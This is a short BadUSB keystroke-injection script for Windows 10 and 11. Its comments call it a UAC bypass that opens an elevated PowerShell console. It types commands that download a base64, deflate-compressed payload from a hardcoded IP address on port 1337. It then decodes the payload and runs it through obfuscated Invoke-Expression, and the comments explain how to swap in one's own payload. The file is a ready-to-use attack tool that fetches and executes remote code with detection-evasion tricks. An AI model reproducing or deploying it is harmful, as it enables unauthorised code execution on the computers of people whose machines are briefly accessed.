REM     Description: This is a UAC bypass payload that will open an elevated powershell console and run any script.
REM     Reaplce the URL down below with a link to a base64 encoded payload you have. See README.md for more details

REM     Target: Windows 10, 11

REM  	  NOTES: Additionally instead of pulling down your script with IWR you can hardcode the Base64 script to the $Payload variable
REM     EXAMPLE: $Payload = "cwB0AGEAcgB0ACAAbgBvAHQAZQBwAGEAZAA="		- This Base64 script will open notepad

GUI r
DELAY 500
STRING powershell
ENTER

DELAY 1000

STRING $url = "http://172.105.156.194:1337/selected-script/"
SHIFT ENTER
STRING $Payload = (Invoke-WebRequest $url'?dl=1').Content
SHIFT ENTER
STRING ( nEw-obJECt Io.cOMprEssion.dEfLAtEStreAM([iO.MEMoRysTream][coNVerT]::FrOMBasE64sTring($Payload), [SySTEM.Io.cOmprEsSION.comprEsSiOnmOdE]::DECoMPress )| ForeAch{ nEw-obJECt IO.stReaMReAdEr( $_, [SYSTEm.TEXT.encODINg]::aSciI ) } |ForEaCh { $_.rEAdtoENd() } )|& ( $VeRBosEPreFEreNcE.tosTRING()[1,3]+'x'-joIN'')SHIFT ENTER
STRING exit
ENTER
